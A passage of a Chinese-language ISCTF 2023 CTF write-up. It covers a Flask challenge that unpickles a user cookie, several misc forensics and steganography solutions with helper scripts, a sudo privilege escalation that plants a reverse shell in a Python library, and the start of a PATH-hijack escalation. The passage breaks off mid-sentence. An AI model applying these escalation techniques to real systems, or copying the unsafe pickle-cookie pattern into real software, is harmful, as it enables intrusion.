class="hljs-name">h3</span>&gt;</span>这场战斗并非势均力敌，有多位大厨在做饭<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>-----------------------------------------------------------------------------<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>You are the ISCTF champion,flag in /champion<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>重伤倒地<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>&#123;name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>动力牛子<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>      &#x27;&#x27;&#x27;<br>      user = base64.b64encode(pickle.dumps(&#123;&quot;name&quot;:name,&quot;is_champion&quot;:0&#125;))<br>      resp = make_response(render_template_string(html))<br>      resp.set_cookie(&#x27;userInfo&#x27;, user)<br>      return resp<br><br>      @app.route(&quot;/champion&quot;)<br>      def getflag():<br>      userInfoCookies = request.cookies.get(&#x27;userInfo&#x27;)<br>      if userInfoCookies is None:<br>      return &quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Bad Request<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot;,400<br>      user = base64.b64decode(userInfoCookies)<br>      if not waf(user):<br>      return &quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>403 Forbidden a<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot;,403<br>      user = pickle.loads(user)<br>      if (champion := user.get(&quot;is_champion&quot;) is None) or (username := user.get(&quot;name&quot;) is None):<br>      return &quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>You are Not TruE champion<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot;,401<br>        if champion != 1:<br>                return &quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>You are Not TruE champion<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot;,401<br>        else:<br>                return f&quot;<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome champion: &#123;name&#125;,But flag in f1__A_g.txt, Get it!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>&quot;<br><br>app.run(host=&quot;0.0.0.0&quot;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>动力牛子<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>源码一个类都没有，就为了一个cookie 就导一个pickle really逆天</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h3 id="ezUSB"><a href="#ezUSB" class="headerlink" title="**ezUSB **"></a>**ezUSB **</h3><p>原汤化原食<br>套神工具秒套神的题<br><img src="/mdimg/isctf2023/7.png"><br><img src="/mdimg/isctf2023/8.png"><br><img src="/mdimg/isctf2023/9.png"><br>这里注意蓝牙和usb键盘流量是连着的<br>所以蓝牙流量最后的是大写然后usb接着又按了大写键，则后面的都为小写</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">AGGSZ&#123;Kp_wn_YRV_sov_jmfyffjs!!!&#125;<br>ISCTF&#123;So_ez_USB_and_vigenere!!!&#125; <br></code></pre></td></tr></table></figure><h3 id="杰伦可是流量明星"><a href="#杰伦可是流量明星" class="headerlink" title="杰伦可是流量明星"></a><strong>杰伦可是流量明星</strong></h3><p>binwalk分离出流量包<br>追踪http流<br><img src="/mdimg/isctf2023/10.png"><br>ISCTF{wddhr836459_83}</p><h3 id="小蓝鲨的秘密"><a href="#小蓝鲨的秘密" class="headerlink" title="小蓝鲨的秘密"></a><strong>小蓝鲨的秘密</strong></h3><p>zip伪加密<br>修复宽高<br>得到key 15CTF2023<br><img src="/mdimg/isctf2023/11.png"></p><h3 id="easy-zip"><a href="#easy-zip" class="headerlink" title="easy_zip"></a><strong>easy_zip</strong></h3><p>爆破纯数字</p><h3 id="蓝鲨的福利"><a href="#蓝鲨的福利" class="headerlink" title="蓝鲨的福利"></a><strong>蓝鲨的福利</strong></h3><p>补png文件头<br><img src="/mdimg/isctf2023/12.png"></p><h3 id="EZcrc"><a href="#EZcrc" class="headerlink" title="EZcrc"></a><strong>EZcrc</strong></h3><p>渊龙Sec的CRC32-Tools脚本跑出来读取zip的crc<br>读出来的不是按顺序的<br>要手动排序一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><br>crc_list = [<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0x67ff2f5b</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x8011b198</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xca923eba</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x671c3b57</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x671c3b57</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xbae88946</span>,<span class="hljs-number">0x8d05071e</span>,<span class="hljs-number">0x44454e88</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0x5133df38</span>,<span class="hljs-number">0x35a296cb</span>,<span class="hljs-number">0x67ff2f5b</span>,<span class="hljs-number">0x55de84d6</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x8d05071e</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x8d05071e</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x3d31ef42</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0xef809c83</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xf1a75063</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x987a20e2</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xca923eba</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x3d31ef42</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x385b0871</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xf1a75063</span>,<span class="hljs-number">0xe9c57755</span>,<span class="hljs-number">0xe9c57755</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xbae88946</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x987a20e2</span>,<span class="hljs-number">0x35a296cb</span>,<span class="hljs-number">0xbae88946</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xffcef5e5</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x671c3b57</span>,<span class="hljs-number">0x961e78b1</span>,<span class="hljs-number">0x7b28dc77</span>,<span class="hljs-number">0x5133df38</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xacb845e7</span>,<span class="hljs-number">0x987a20e2</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xffcef5e5</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x385b0871</span>,<span class="hljs-number">0xe9c57755</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x385b0871</span>,<span class="hljs-number">0x55de84d6</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0x44454e88</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x385b0871</span>,<span class="hljs-number">0x44454e88</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xf1a75063</span>,<span class="hljs-number">0x8ad3bf47</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xf9cd093c</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xe71302b2</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xca923eba</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x3d31ef42</span>,<span class="hljs-number">0x5133df38</span>,<span class="hljs-number">0x35a296cb</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0xe71302b2</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xbae88946</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x8d05071e</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x8011b198</span>,<span class="hljs-number">0x5133df38</span>,<span class="hljs-number">0x67ff2f5b</span>,<span class="hljs-number">0x3556ac70</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0x2bd745ce</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x671c3b57</span>,<span class="hljs-number">0xffcef5e5</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0x80a37b94</span>,<span class="hljs-number">0xd2b184ff</span>,<span class="hljs-number">0xb462df74</span>,<span class="hljs-number">0x32973a9e</span>,<span class="hljs-number">0xb10371d</span>,<span class="hljs-number">0xe9c57755</span>,<span class="hljs-number">0xef809c83</span>]<br><span class="hljs-keyword">for</span> target_crc <span class="hljs-keyword">in</span> crc_list:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>                data = <span class="hljs-built_in">bytes</span>([i, j, k])  <span class="hljs-comment"># 构造3字节数据</span><br>                crc = zlib.crc32(data) &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment"># 计算CRC32值</span><br>                <span class="hljs-keyword">if</span> crc == target_crc:<br>                    data=data.decode()<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found matching data: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Finished searching.&quot;</span>)<br></code></pre></td></tr></table></figure><p>对表手搓<br>base64decode2次<br><img src="/mdimg/isctf2023/13.png"></p><h3 id="Ez-misc"><a href="#Ez-misc" class="headerlink" title="Ez_misc"></a><strong>Ez_misc</strong></h3><p>key在最后一页<br>M13c_!ps2s23<br>加文件头FFD8FFE0<br><img src="/mdimg/isctf2023/14.png"></p><h3 id="spalshes"><a href="#spalshes" class="headerlink" title="spalshes"></a><strong>spalshes</strong></h3><p>做题习惯，zip先挂着爆破<br><img src="/mdimg/isctf2023/15.png"><br>设置纯数字密钥我是没想到的，但凡加几个字符都爆破不出来…感觉一堆非预期<br>直接做吧<br>base64解码后为点数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># 提供的数据</span><br>data = [<br>    <span class="hljs-number">1</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>,<br>    <span class="hljs-number">4</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>,<br>    <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>,<br>    <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>,<br>    <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>,<br>    <span class="hljs-number">11.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">11.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span><br>]<br><br><span class="hljs-comment"># 将数据分割成 x 和 y 坐标</span><br>x = data[::<span class="hljs-number">3</span>]<br>y = data[<span class="hljs-number">1</span>::<span class="hljs-number">3</span>]<br><br><span class="hljs-comment"># 绘制散点图</span><br>plt.scatter(x, y)<br>plt.title(<span class="hljs-string">&#x27;Scatter Plot&#x27;</span>)<br>plt.xlabel(<span class="hljs-string">&#x27;X-axis&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;Y-axis&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/isctf2023/16.png"><br><img src="/mdimg/isctf2023/17.png"></p><h3 id="镜流"><a href="#镜流" class="headerlink" title="镜流"></a><strong>镜流</strong></h3><p>爆破 306256<br>hint 把图片缩小10倍</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./1new.png&#x27;</span>)<br>w = img.width<br>h = img.height<br>img_obj = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(w//<span class="hljs-number">10</span>,h//<span class="hljs-number">10</span>))<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w//<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h//<span class="hljs-number">10</span>):<br>        (r,g,b)=img.getpixel((x*<span class="hljs-number">10</span>,y*<span class="hljs-number">10</span>))<br>        img_obj.putpixel((x,y),(r,g,b))<br><br>img_obj.save(<span class="hljs-string">&#x27;./1.png&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>zsteg -e b1,rgb,lsb,xy ./1.png &gt; flag.png<br><img src="/mdimg/isctf2023/18.png"><br>ISCTF{JINGLIU_IS_SO_COOL}</p><h3 id="张万森-下雪了"><a href="#张万森-下雪了" class="headerlink" title="张万森,下雪了"></a>张万森,下雪了</h3><p>用给的字典爆破 blueSHARK666<br>tip.txt 解很多层base64<br>词频分析 得到key ISCTFZ023<br>snow隐写<br><img src="/mdimg/isctf2023/19.png"><br>ISCTF{34da-a87s-sk87-s384-3982-398233}</p><h3 id="MCSOG-猫猫"><a href="#MCSOG-猫猫" class="headerlink" title="MCSOG-猫猫"></a><strong>MCSOG-猫猫</strong></h3><p>linux vim 打开可以看见只有 200c 200e 202c<br><img src="/mdimg/isctf2023/20.png"></p><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a><strong>stream</strong></h3><p>盲注<br>成功的返回包总长度是1072<br>手搓<br><img src="/mdimg/isctf2023/21.png"></p><h3 id="PNG的基本食用"><a href="#PNG的基本食用" class="headerlink" title="PNG的基本食用"></a><strong>PNG的基本食用</strong></h3><p>1 修改宽高<br>2 lsb<br><img src="/mdimg/isctf2023/22.png"><br>3 提取尾部7z<br>拼接 ISCTF{png-is-so-ez-for-you}</p><h3 id="sudopy"><a href="#sudopy" class="headerlink" title="sudopy"></a><strong>sudopy</strong></h3><p><img src="/mdimg/isctf2023/23.png"><br>导入了一个python库<br>python提权<br><img src="/mdimg/isctf2023/24.png"><br>vim /usr/lib/python3.10/webbrowser.py<br>加入本地弹shell的语句<br><img src="/mdimg/isctf2023/25.png"><br>sudo /usr/bin/python3 /home/ctf/web.py<br><img src="/mdimg/isctf2023/26.png"><br>其实也可以直接重写 web.py 或者直接在里面加弹shell语句</p><h3 id="status"><a href="#status" class="headerlink" title="status"></a><strong>status</strong></h3><p><img src="/mdimg/isctf2023/27.png"><br>checkgenshin 有执行权限<br>丢ida<br><img src="/mdimg/isctf2023/28.png"><br>可以看到这个脚本前面设置root权限然后执行一个system命令<br>linux的命令是在环境变量里寻找并通过脚本文件执行的<br>也就是说<br>可以通过劫持环境变量，让这个checkgenshin 